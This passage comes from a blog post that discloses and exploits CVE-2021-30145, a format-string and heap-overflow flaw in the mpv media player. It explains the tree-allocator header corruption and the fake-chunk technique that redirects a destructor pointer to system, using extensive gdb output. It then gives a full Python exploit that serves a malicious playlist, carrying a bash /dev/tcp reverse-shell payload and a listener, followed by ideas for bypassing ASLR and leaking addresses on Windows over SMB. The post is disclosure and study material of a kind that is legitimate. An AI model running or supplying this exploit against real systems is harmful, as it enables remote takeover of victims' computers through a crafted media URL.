0x5555555ae330 <open_mf_pattern+400>: mov rdi,r12
0x5555555ae333 <open_mf_pattern+403>: lea rsi,[rax+0x20]
=> 0x5555555ae337 <open_mf_pattern+407>: call 0x55555565e290 <ta_alloc_size>
0x5555555ae33c <open_mf_pattern+412>: lea rsi,[rip+0xb898c] # 0x555555666ccf
0x5555555ae343 <open_mf_pattern+419>: mov rdi,rax
0x5555555ae346 <open_mf_pattern+422>: call 0x55555565e680 <ta_dbg_set_loc>
0x5555555ae34b <open_mf_pattern+427>: mov rdi,rax
Guessed arguments:
arg[0]: 0x7fffe4002020 --> 0x7fffe4001970 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
arg[1]: 0x26 ('&')
...`

The requested size for the allocation is 0x26 = 38 bytes (strlen(“%1000d”) + 32).

The address of the allocated chunk is stored in RAX after we proceed to the next instruction:

`gdb-peda$ ni
[----------------------------------registers-----------------------------------]
RAX: 0x7fffe40020a0 --> 0x0
...
[-------------------------------------code-------------------------------------]
0x5555555ae330 <open_mf_pattern+400>: mov rdi,r12
0x5555555ae333 <open_mf_pattern+403>: lea rsi,[rax+0x20]
0x5555555ae337 <open_mf_pattern+407>: call 0x55555565e290 <ta_alloc_size>
=> 0x5555555ae33c <open_mf_pattern+412>: lea rsi,[rip+0xb898c] # 0x555555666ccf`

Since the chunk was allocated using talloc\_size, it contains a special header (struct ta\_header), which begins 0x50 bytes before the return address. We will get to the details in the [exploitation section](#expl). For now it is only necessary to know that the first member of the header (0x0000000000000026) is the size of the allocated chunk:

`...
gdb-peda$ x/20xg 0x7fffe40020a0-0x50
0x7fffe4002050: 0x0000000000000026 0x0000000000000000
0x7fffe4002060: 0x0000000000000000 0x0000000000000000
0x7fffe4002070: 0x00007fffe4001fd0 0x0000000000000000
0x7fffe4002080: 0x00000000d3adb3ef 0x0000000000000000
0x7fffe4002090: 0x0000000000000000 0x0000000000000000
0x7fffe40020a0: 0x0000000000000000 0x0000000000000000
0x7fffe40020b0: 0x0000000000000000 0x0000000000000000
0x7fffe40020c0: 0x0000000000000000 0x000000000001ef41
0x7fffe40020d0: 0x0000000000000000 0x0000000000000000
0x7fffe40020e0: 0x0000000000000000 0x0000000000000000`

Now let’s proceed to the call to \_\_sprintf\_chk:

`gdb-peda$ c
Continuing.
...
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe40020a0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe40011f5 --> 0x643030303125 ('%1000d')
arg[4]: 0x0`

We can verify that the destination buffer is the allocated chunk at 0x7fffe40020a0. Let’s execute the \_\_sprintf\_chk by stepping to the next instruction:

`gdb-peda$ ni
...
0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
=> 0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13`

The \_\_sprintf\_chk call wrote way beyond the 0x26 bytes allocated for the chunk:

`gdb-peda$ x/100xg 0x7fffe40020a0-0x50
0x7fffe4002050: 0x0000000000000026 0x0000000000000000
0x7fffe4002060: 0x0000000000000000 0x0000000000000000
0x7fffe4002070: 0x00007fffe4001fd0 0x0000000000000000
0x7fffe4002080: 0x00000000d3adb3ef 0x0000000000000000
0x7fffe4002090: 0x0000000000000000 0x0000555555666ccf
0x7fffe40020a0: 0x2020202020202020 0x2020202020202020
0x7fffe40020b0: 0x2020202020202020 0x2020202020202020
0x7fffe40020c0: 0x2020202020202020 0x2020202020202020
0x7fffe40020d0: 0x2020202020202020 0x2020202020202020
0x7fffe40020e0: 0x2020202020202020 0x2020202020202020
0x7fffe40020f0: 0x2020202020202020 0x2020202020202020
0x7fffe4002100: 0x2020202020202020 0x2020202020202020
0x7fffe4002110: 0x2020202020202020 0x2020202020202020
0x7fffe4002120: 0x2020202020202020 0x2020202020202020
0x7fffe4002130: 0x2020202020202020 0x2020202020202020
0x7fffe4002140: 0x2020202020202020 0x2020202020202020
0x7fffe4002150: 0x2020202020202020 0x2020202020202020
0x7fffe4002160: 0x2020202020202020 0x2020202020202020
0x7fffe4002170: 0x2020202020202020 0x2020202020202020
0x7fffe4002180: 0x2020202020202020 0x2020202020202020
0x7fffe4002190: 0x2020202020202020 0x2020202020202020
0x7fffe40021a0: 0x2020202020202020 0x2020202020202020
...`

If we continue the execution of the program, we get a segmentation fault because of the corrupted heap:

`gdb-peda$ d br 1
gdb-peda$ c
Continuing.
[mf] number of files: 0
free(): invalid next size (fast)
Thread 3 "mpv/opener" received signal SIGABRT, Aborted.
...
Stopped reason: SIGABRT
__GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
50 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.`

We have verified that the sprintf call also results in a heap overflow vulnerability.

# Exploitation

In the last section we have seen that the usage of sprintf with a user controllable format string and no boundary checks introduces two kind of vulnerabilities: a format string vulnerability as well as a heap overflow, which is based on the format string vulnerability.

A format string vulnerability is usually a very powerful exploitation primitive. The combination of output padding (e.g. %1337d) with the usage of the %n format specifier can generally be used in order to write arbitrary values to memory. By [leveraging the dynamic field width](https://devel0pment.de/?p=1881#shellcode) it might even be possible to bypass ASLR in an one-shot exploit. Though in this case the impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Because of this the call to sprintf is replaced with a call to \_\_sprintf\_chk, which terminates the program if a %n format specifier is used within a format string in writable memory (\*\*\* %n in writable segment detected \*\*\*). In order to determine this \_\_sprintf\_chk parses the output of /proc/self/maps. From a security perspective this is a good trade-off: the %n can still be used in static (read-only) strings, but the primary exploitation technique (using %n in a writable format string) is eliminated. From an exploitation development perspective this is bad: we cannot use the format string vulnerability to write to memory. This limits it to the ability to leak memory addresses, which is quite useless considering the assumed attack vector, where a victim is lured into opening a malicious URL. For a remote attacker it is not of any use, if a few leaked addresses pop up in the victims shell. On Windows the situation is a little bit different, but we will focus on Linux for now.

Here we are left with the heap overflow, which is based on the format string vulnerability and can be provoked by using padded format specifiers. A heap overflow introduces a huge amount of exploitation possibilities, but is very dependent on the concrete context. In some situations even a single null byte overflow can be used to gain arbitrary code execution by [corrupting the heap meta data](https://devel0pment.de/?p=688).

For the development of this proof of concept exploit I am using mpv 0.33.0 on Ubuntu 20.04.2 LTS with GLIBC 2.31-0ubuntu9.2 and ASLR disabled.

We have already seen that mpv seems to use some custom allocation mechanisms, since the chunk for the format string was not allocated using a plain malloc, but rather the custom function talloc\_size. The allocator used here is called Tree Allocator, which core is implemented in [ta.c](https://github.com/mpv-player/mpv/blob/v0.33.0/ta/ta.c). More details can be found [here](https://github.com/mpv-player/mpv/tree/v0.33.0/ta). Basically the idea is to not only have independently allocated chunks, but a tree structure of allocated chunks. For this purpose each chunk is proceeded by a header struct called ta\_header:

`struct ta_header {
size_t size; // size of the user allocation
// Invariant: parent!=NULL => prev==NULL
struct ta_header *prev; // siblings list (by destructor order)
struct ta_header *next;
// Invariant: parent==NULL || parent->child==this
struct ta_header *child; // points to first child
struct ta_header *parent; // set for _first_ child only, NULL otherwise
void (*destructor)(void *);
#if TA_MEMORY_DEBUGGING
unsigned int canary;
struct ta_header *leak_next;
struct ta_header *leak_prev;
const char *name;
#endif
};`

What is really eye-catching here from an exploitation point of view is the destructor function pointer. Having a function pointer on the heap possibly enables the ability to leverage the heap overflow vulnerability in order to overflow into an adjacent chunk overwriting this function pointer. When the program calls the destructor function for this specific chunk without crashing beforehand, we gain code execution.

In the above ta\_header struct we can also see, that there is a canary member if TA\_MEMORY\_DEBUGGING is enabled, which is the case by default. Though the purpose of this canary is to prevent software bugs rather than being an exploitation mitigation. Accordingly the canary is always set to the static value 0xD3ADB3EF:

`...
#define CANARY 0xD3ADB3EF
...
static void ta_dbg_add(struct ta_header *h)
{
h->canary = CANARY;
...`

My first approach was to simply follow the before mentioned strategy: overflow into an adjacent chunk and overwrite the destructor function pointer. At first we need to determine where the destructor function is called from. This leads us to the function ta\_free:

`void ta_free(void *ptr)
{
struct ta_header *h = get_header(ptr);
if (!h)
return;
if (h->destructor)
h->destructor(ptr);
ta_free_children(ptr);
ta_set_parent(ptr, NULL);
ta_dbg_remove(h);
free(h);
}`

The logic is straightforward: if the destructor is set (not NULL), it is called with the first argument being the chunk pointer to be free’d (ptr). Beforehand (in the first line) get\_header is called to get the pointer to the ta\_header struct. Within get\_header an additional function named ta\_dbg\_check\_header is called:

`static struct ta_header *get_header(void *ptr)
{
struct ta_header *h = ptr ? PTR_TO_HEADER(ptr) : NULL;
ta_dbg_check_header(h);
return h;
}`

This function validates the chunk by comparing the canary value and checking the integrity of the parent pointer:

`static void ta_dbg_check_header(struct ta_header *h)
{
if (h) {
assert(h->canary == CANARY);
if (h->parent) {
assert(!h->prev);
assert(h->parent->child == h);
}
}
}`

We need to keep this in mind when crafting our exploit.

At first we start to implement a little web-server, which only serves a playlist file (regardless of the request):

`#!/usr/bin/env python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('localhost', 7000))
s.listen(5)
c, a = s.accept()
playlist = b'mf://'
playlist += b'A'*0x48
playlist += b'%d' # we need a '%' to reach vulnerable path
d = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'\r\n'
d += playlist
c.send(d)
c.close()`

The script starts a listening socket on port 7000 and answers to all connecting clients with a HTTP response containing a playlist file (Content-type: audio/x-mpegurl). The playlist in the body only contains a single entry: mf://AAAA…%d. The % is necessary to reach the \_\_sprintf\_chk call. The amount of As (0x48) is used to adjust the size of the filename. This is relevant, because depending on the size of the filename, the allocated chunk ends up in different heap locations. If we for example only use mf://AAAA%d the call to ta\_alloc\_size requests a smaller chunk for the destination buffer, which will be served from a different location in the heap. Using ‘mf://’ + ‘A’\*0x48 + ‘%d’ turned out to end up in a suitable heap location. Let’s start gdb again, set a breakpoint on the \_\_sprintf\_chk call and try to open the playlist:

`gdb-peda$ b *open_mf_pattern+559
Breakpoint 1 at 0x5a3cf: file /usr/include/x86_64-linux-gnu/bits/stdio2.h, line 36.
gdb-peda$ r http://localhost:7000/x.m3u
Starting program: /home/user/opt/mpv/build/mpv http://localhost:7000/x.m3u
...
[-------------------------------------code-------------------------------------]
0x5555555ae3c0 <open_mf_pattern+544>: mov rdx,0xffffffffffffffff
0x5555555ae3c7 <open_mf_pattern+551>: mov esi,0x1
0x5555555ae3cc <open_mf_pattern+556>: add ebx,0x1
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe400e930 --> 0x55555572bba0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe408f695 ('A' <repeats 72 times>, "%d")
arg[4]: 0x0
...`

We hit the breakpoint. The destination of \_\_sprintf\_chk, which is the chunk allocated by ta\_alloc\_size is located at 0x7fffe400e930 (first parameter). This address references the actual data of the allocated chunk. In order to see the ta\_header before it, we need to substract 0x50 from this address:

`gdb-peda$ x/70xg 0x7fffe400e930-0x50
0x7fffe400e8e0: 0x000000000000006a 0x0000000000000000 <-- [ size | prev ]
0x7fffe400e8f0: 0x0000000000000000 0x0000000000000000 <-- [ next | child ]
0x7fffe400e900: 0x00007fffe400d0a0 0x0000000000000000 <-- [ parent | destructor ]
0x7fffe400e910: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | leak_next ]
0x7fffe400e920: 0x0000000000000000 0x0000555555666ccf <-- [ leak_prev | name ]
0x7fffe400e930: 0x000055555572bba0 0x0000000000000009 <-- begin actual data ...
0x7fffe400e940: 0x00007fffe400d3f0 0x0000000000000001
0x7fffe400e950: 0x0000000000000080 0x0000000000000084
0x7fffe400e960: 0x00007fffe400dda0 0x00007fffe40008d0
0x7fffe400e970: 0x0000000000000000 0x0000000000000000
0x7fffe400e980: 0x0000000000000000 0x0000000000000000
0x7fffe400e990: 0x0000000000000000 0x0000000000000000
0x7fffe400e9a0: 0x0000000000000000 0x0000000000000031
0x7fffe400e9b0: 0x00007fffe4000080 0x00007fffe4000080
0x7fffe400e9c0: 0x0000000000000000 0x000000810000ac44
0x7fffe400e9d0: 0x0000000000000030 0x00000000000000f4
0x7fffe400e9e0: 0x00007fffe400f240 0x00005555556ec010
0x7fffe400e9f0: 0x0000000000000000 0x0000000000000000
0x7fffe400ea00: 0x0000000000000000 0x00005555555d92e0
0x7fffe400ea10: 0x0000000000000000 0x0000000000000000
0x7fffe400ea20: 0x0000000000000000 0x0000555555670d90
0x7fffe400ea30: 0x00007fffe400f290 0x0000000000000000
0x7fffe400ea40: 0x0000000000000000 0x000055555572bba0
0x7fffe400ea50: 0x00007fffe400ea58 0x0000000000000000
0x7fffe400ea60: 0x00007fffe400e5c0 0x000055555572c470
0x7fffe400ea70: 0x000055555572bba0 0x0000002100000020
0x7fffe400ea80: 0x0000000000000000 0xffffffff00000000
0x7fffe400ea90: 0x0000000000000000 0x0000000000000000
0x7fffe400eaa0: 0x0000000000000000 0x0000000000000000
0x7fffe400eab0: 0x0000000000000000 0x0000000000000000
0x7fffe400eac0: 0x0000000000000000 0x0000000000000265
0x7fffe400ead0: 0x00000000000001f8 0x00007fffe400cf50 <-- [ size | prev ]
0x7fffe400eae0: 0x00007fffe400e6a0 0x00007fffe400e7f0 <-- [ next | child ]
0x7fffe400eaf0: 0x0000000000000000 0x0000000000000000 <-- [ parent | destructor ]
0x7fffe400eb00: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | ...`

We can see that there is actually an adjacent chunk, which ta\_header struct begins at 0x7fffe400ead0.

Our next goal is to overwrite the destructor pointer of this adjacent chunk. We also need to ensure that we bypass the check within ta\_dbg\_check\_header mentioned before:

`static void ta_dbg_check_header(struct ta_header *h)
{
if (h) {
assert(h->canary == CANARY);
if (h->parent) {
assert(!h->prev);
assert(h->parent->child == h);
}
}
}`

The canary value is not a problem, because it is located after the destructor pointer. Though we need to set the parent to NULL, in order to prevent the assertion checks within the inner if statement.

This can be satisfied by using the following URL:

`...
playlist = b'mf://'
playlist += b'A'*0x18
playlist += b'%422c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\xef\xbe\xad\xde'
...`

The b’A’\*0x18 ensures that the size of the filename stays the same so that we end up in the desired heap location. The first padded format specifier %422c provokes the heap overflow and ensures that the following data ends up at the correct location within the ta\_header of the adjacent chunk. The purpose of the two following %c is just to skip to an argument, which value is 0. This is the case for the fourth argument as we can see on the call to \_\_sprintf\_chk:

`...
R8 : 0x0 <-- 1st argument (will change due to the for loop)
R9 : 0x4 <-- 2nd argument
...
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
...
[------------------------------------stack-------------------------------------]
0000| 0x7fffebcaee00 --> 0x7fffebcaf0df --> 0x5555556b95a000 <-- 3rd argument
0008| 0x7fffebcaee08 --> 0x0 <-- 4th argument
...`

On the first call to \_\_sprintf\_chk the first argument is 0 too, but this will change on the next loop iteration. The fourth argument stays 0 throughout the loop, so we use this.

Next within the URL is %4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c, which writes eight null bytes (0x0000000000000000) to the destination. These will end up in the parent pointer of the adjacent chunk. After this follows \xef\xbe\xad\xde, which will write the value 0xdeadbeef to the destructor pointer:

`struct ta_header {
...
struct ta_header *parent; // <-- 0x0000000000000000
void (*destructor)(void *); // <-- 0xdeadbeef
...
};`

Let’s rerun the web-server with the adjusted URL and open it with mpv:

`gdb-peda$ r http://localhost:7000/x.m3u
Starting program: /home/user/opt/mpv/build/mpv http://localhost:7000/x.m3u
...
[-------------------------------------code-------------------------------------]
0x5555555ae3c0 <open_mf_pattern+544>: mov rdx,0xffffffffffffffff
0x5555555ae3c7 <open_mf_pattern+551>: mov esi,0x1
0x5555555ae3cc <open_mf_pattern+556>: add ebx,0x1
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe400e930 --> 0x55555572bba0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe408f695 ('A' <repeats 24 times>, "%422c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c", <incomplete sequence \336>)
arg[4]: 0x0
...`

At this point we are right before the call to \_\_sprintf\_chk and the adjacent chunk is still untouched:

`gdb-peda$ x/10xg 0x7fffe400ead0
0x7fffe400ead0: 0x00000000000001f8 0x00007fffe400cf50 <-- [ size | prev ]
0x7fffe400eae0: 0x00007fffe400e6a0 0x00007fffe400e7f0 <-- [ next | child ]
0x7fffe400eaf0: 0x0000000000000000 0x0000000000000000 <-- [ parent | destructor ]
0x7fffe400eb00: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | leak_next ]
0x7fffe400eb10: 0x0000000000000000 0x0000555555664822 <-- [ leak_prev | name ]`

If we now step to the next instruction, \_\_sprintf\_chk is called with our format string and the overflow is triggered:

`gdb-peda$ ni
...
gdb-peda$ x/10xg 0x7fffe400ead0
0x7fffe400ead0: 0x2020202020202020 0x2020202020202020 <-- [ size | prev ]
0x7fffe400eae0: 0x2020202020202020 0xdf04002020202020 <-- [ next | child ]
0x7fffe400eaf0: 0x0000000000000000 0x00000000deadbeef <-- [ parent | destructor ]
0x7fffe400eb00: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | leak_next ]
0x7fffe400eb10: 0x0000000000000000 0x0000555555664822 <-- [ leak_prev | name ]`

The first members of the ta\_header are simply overwritten with 0x20 bytes (space), because of the padding we used. Though these members are not relevant in order to reach the destructor function call. The parent member was successfully overwritten with 0x0000000000000000 and the destructor with 0x00000000deadbeef. If we continue the execution, we get a segmentation fault, which is caused by the RIP being 0xdeadbeef:

`gdb-peda$ c
Continuing.
[mf] number of files: 0
Thread 4 "mpv/opener" received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xdeadbeef
RBX: 0x7fffe4001500 --> 0x5555556b95a0 --> 0x555555666d36 --> 0x6567616d6900666d ('mf')
RCX: 0x1
RDX: 0x0
RSI: 0x7fffe400cf50 --> 0x0
RDI: 0x7fffe400eb20 --> 0x7fffe400e6f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
RBP: 0x7fffe400eb20 --> 0x7fffe400e6f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
RSP: 0x7fffebcaf0d8 --> 0x55555565e40d (<ta_free+45>: mov rdi,rbp)
RIP: 0xdeadbeef
R8 : 0x0
R9 : 0x1
R10: 0x1
R11: 0x0
R12: 0x7fffe400ead0 (" ")
R13: 0x7fffe40016f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
R14: 0x55555572b320 --> 0x55555572b5d0 --> 0x55555572b460 (0x000055555572b320)
R15: 0x5555556b95a0 --> 0x555555666d36 --> 0x6567616d6900666d ('mf')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xdeadbeef
[------------------------------------stack-------------------------------------]
0000| 0x7fffebcaf0d8 --> 0x55555565e40d (<ta_free+45>: mov rdi,rbp)
0008| 0x7fffebcaf0e0 --> 0x7fffe40016f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
0016| 0x7fffebcaf0e8 --> 0x7fffe4001500 --> 0x5555556b95a0 --> 0x555555666d36 --> 0x6567616d6900666d ('mf')
0024| 0x7fffebcaf0f0 --> 0x7fffe40014b0 --> 0xf8
0032| 0x7fffebcaf0f8 --> 0x55555565e5b9 (<ta_free_children+41>: mov rdi,QWORD PTR [rbx-0x38])
0040| 0x7fffebcaf100 --> 0x7fffebcaf260 --> 0xc2f000000 ('')
0048| 0x7fffebcaf108 --> 0x55555565e415 (<ta_free+53>: mov rdi,rbp)
0056| 0x7fffebcaf110 --> 0x7fffe400eb20 --> 0x7fffe400e6f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000deadbeef in ?? ()`

We successfully control the instruction pointer. Though the context is not very opportune. At this point we only control the RIP, but no other registers. Since we are not directly interacting with the program, we cannot simply use a one\_gadget. My first idea was to find a gadget, which will change RSP and R12, because it seems that we can control the content the pointer in R12 is referencing (spaces from padding: ” “). If RSP would be set to this address, we could store a more complex ROP chain there. Nevertheless I didn’t find a suitable gadget.

By reading the source code again I came up with another idea. Let’s have a look at ta\_free again:

`void ta_free(void *ptr)
{
struct ta_header *h = get_header(ptr);
if (!h)
return;
if (h->destructor)
h->destructor(ptr);
ta_free_children(ptr);
ta_set_parent(ptr, NULL);
ta_dbg_remove(h);
free(h);
}`

After the destructor call the function ta\_free\_children is called, which is obviously responsible for free’ing a child chunk. The function retrieves the child pointer within the ta\_header and also passes it to ta\_free, if it is set:

`void ta_free_children(void *ptr)
{
struct ta_header *h = get_header(ptr);
while (h && h->child)
ta_free(PTR_FROM_HEADER(h->child));
}`

This enables another strategy: instead of directly overwriting the destructor pointer, we can overwrite the child pointer with the address of a forged fake chunk. For this fake chunk we set the destructor pointer to the function address of system and store a command of our choice in the actual data. When ta\_free is called for this child, the ptr points to the command. This ptr is passed as the first argument to the destructor, which is system. This way we can run arbitrary commands through system. This is very similar to a glibc heap exploit, where \_\_free\_hook is set to system and a chunk is free’d, which contains the command to be executed.

Storing the fake chunk in the URL is not a very good option, because editing the URL also results in another allocation size. This possibly causes the chunk to end up in another heap location. Also we must use the format specifier %4$c in order to write a single null byte. A more suitable place for the fake chunk is the HTTP response we send. We can simply insert a custom HTTP header, which is not evaluated by the target application and only serves the purpose of delivering our fake chunk to the memory of the application. The adjustments in the script look like this:

`...
playlist = b'mf://'
playlist += b'%390c%c%c'
playlist += b'\x58\x1e%4$c\xe4\xff\x7f' # overwriting child addr with fake child
SYSTEM_ADDR = 0x7ffff5c37410
CANARY = 0xD3ADB3EF
fake_chunk = p64(0) # size
fake_chunk += p64(0) # prev
fake_chunk += p64(0) # next
fake_chunk += p64(0) # child
fake_chunk += p64(0) # parent
fake_chunk += p64(SYSTEM_ADDR) # destructor
fake_chunk += p64(CANARY) # canary
fake_chunk += p64(0) # leak_next
fake_chunk += p64(0) # leak_prev
fake_chunk += p64(0) # name
d = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'PL: '
d += fake_chunk
d += b'gnome-calculator\x00'
d += b'\r\n'
d += b'\r\n'
d += playlist
...`

The padding has changed to %390c, since we are now targeting the child member of the ta\_header. This pointer is overwritten with the static address 0x7fffe4001e58 (ASLR is disabled!), which references the fake chunk stored in the HTTP response. The destructor of the fake chunk is set to system. Also canary is set to the required value 0xD3ADB3EF (this is important for the validation check within ta\_dbg\_check\_header). The command to be executed is set to gnome-calculator to spawn a calculator.

In order to trigger the exploit, we run the payload serving script and start mpv with the malicious playlist URL:

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_01.gif)

Since we have full control of the executed command, we can easily run more complex commands like a reverse shell. The following python script uses such a reverse shell payload and starts a corresponding handler as well as the payload serving web-server:

`#!/usr/bin/env python3
import socket
from pwn import *
from threading import Thread
LHOST = 'localhost'
LPORT = 9001
SRVHOST = 'localhost'
SRVPORT = 7000
OFFSET = 390 # padding to overflow heap
CANARY = 0xD3ADB3EF
SYSTEM_ADDR = 0x7ffff5c37410
PAYLOAD = 'bash -c "bash -i >& /dev/tcp/'+LHOST+'/'+str(LPORT)+' 0>&1"\x00'
class RevShellHandler(Thread):
def run(self):
while True:
io = listen(LPORT, LHOST)
io.wait_for_connection()
io.interactive()
class PayloadHandler(Thread):
def run(self):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRVHOST, SRVPORT))
s.listen(5)
log.info('ready to serve payload on http://'+SRVHOST+':'+str(SRVPORT)+'/x.m3u')
while True:
c, a = s.accept()
self.handle_client(c, a)
def handle_client(self, c, a):
log.warn('serving payload to '+a[0]+':'+str(a[1]))
playlist = b'mf://'
playlist += b'%'+str(OFFSET).encode()+b'c%c%c'
playlist += b'\x58\x1e%4$c\xe4\xff\x7f' # overwriting child addr with fake child
fake_chunk = p64(0) # size
fake_chunk += p64(0) # prev
fake_chunk += p64(0) # next
fake_chunk += p64(0) # child
fake_chunk += p64(0) # parent
fake_chunk += p64(SYSTEM_ADDR) # destructor
fake_chunk += p64(CANARY) # canary
fake_chunk += p64(0) # leak_next
fake_chunk += p64(0) # leak_prev
fake_chunk += p64(0) # name
d = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'PL: '
d += fake_chunk
d += PAYLOAD.encode()
d += b'\r\n'
d += b'\r\n'
d += playlist
c.send(d)
c.close()
reh = RevShellHandler()
reh.start()
plh = PayloadHandler()
plh.start()`

The script in action:

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_02.gif)
# Further Thoughts

In this section we will take a look at possibilities to bypass ASLR and briefly determine how the situation is on Windows from an exploit development point of view.

### ASLR bypass

After having verified that we can gain arbitrary code execution on Linux with ASLR disabled, let’s think about how ASLR might be bypassed.

What makes this challenging is that the attack vector seems to be a one-shot: the targeted client requests the malicious playlist from us and we serve the payload in form of the mf:// URL. The communication ends here and there seems to be no way we could get an address leak required to bypass ASLR. Though this is not totally true. The word playlist implies that this file is a list. We can not only store one malicious mf:// URL, but for example an additional http:// URL like this:

`mf://<EVIL>
http://attacker/xyz`

Before the first entry in the playlist (mf://<EVIL>) is evaluated, the whole playlist is parsed. This includes allocating chunks for all entries within the playlist. After this the entries are evaluated or fetched one after another. Using the mf://<EVIL> entry we can leverage the heap overflow in order to overwrite the second playlist entry, which is the http://attacker/xyz URL to fetch next. If we change this URL to contain an address from the application, we retrieve this address via HTTP as soon as the client requests it. The challenge here is to groom the heap, so that the chunk allocated for the \_\_sprintf\_chk destination is right before the chunk allocated for the http://attacker/xyz URL to fetch.

The next question is how do we use the leaked address without the requirement of having to manually open yet another malicious playlist URL? The answer to this is straightforward: we simply use a cascade by additionally providing the URL to another playlist .m3u file:

`mf://<EVIL>
http://attacker/xyz
http://attacker/stage2.m3u`

This way the stage2.m3u playlist will be requested after the http://attacker/xyz request and its content will be evaluated just like the playlist before. This time the stage2.m3u playlist file can contain our original exploit to gain code execution, but is created on the fly to contain the correct addresses based on the first HTTP request (http://attacker/xyz), which leaked the applications addresses.

### Windows

mpv is available for a wide variety of operation systems, but let’s have at least a brief look at Windows.

Although I didn’t dig deep into developing an exploit for Windows yet, I assume that the conditions are far more in our favor here. One reason for this is that there is no FORTIFY\_SOURCE by default. Thus we are able to use the %n format specifier in order to write to memory. What makes it a little less comfortable is that there are no argument selectors (e.g. %4$c).

There is another interesting Windows specific aspect when using the mf:// protocol. On Linux we can reference the local file /tmp/test.jpg by providing mf:///tmp/test.jpg. On Windows we would use mf://C:\Windows\Temp\test.jpg in order to reference the file C:\windows\Temp\test.jpg. When dealing with file paths like this, it is sometimes possible to increase the exploitation possibilities on Windows by using [UNC paths](https://en.wikipedia.org/wiki/Path_%28computing%29#Universal_Naming_Convention). This is totally true here, because we can actually use a UNC path within the mf:// protocol handler. Also we can provide format specifiers in the requested UNC path. This means that we can easily leak addresses via SMB:

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_03.gif)

This possibility makes it even more easy to bypass ASLR on Windows.

# Conclusion

The exciting aspect of memory corruption vulnerabilities is that they arise a lot of opportunities, which oftentimes can be turned into code execution by putting enough work into it.

Even with mitigations like FORTIFY\_SOURCE the impact of a format string vulnerability is most probably severe. In this case the implicitly deduced heap overflow allows an attacker to gain arbitrary code execution on Linux. Also there are ways to bypass ASLR and probably also develop an exploit for other operating systems.

Thanks again to the mpv team for the quick response, professional reaction and fast patch. It is good to know that security is taken seriously 🙂

**Timeline**

03 April 2021 – Vendor Notification

03 April 2021 – Vendor Acknowledgement

05 April 2021 – Vendor Patch

12 April 2021 – Public Disclosure

 Post Views: 16,969

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2021-30145](https://devel0pment.de/?tag=cve-2021-30145), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [heap](https://devel0pment.de/?tag=heap), [linux](https://devel0pment.de/?tag=linux), [x64](https://devel0pment.de/?tag=x64)

## Post navigation

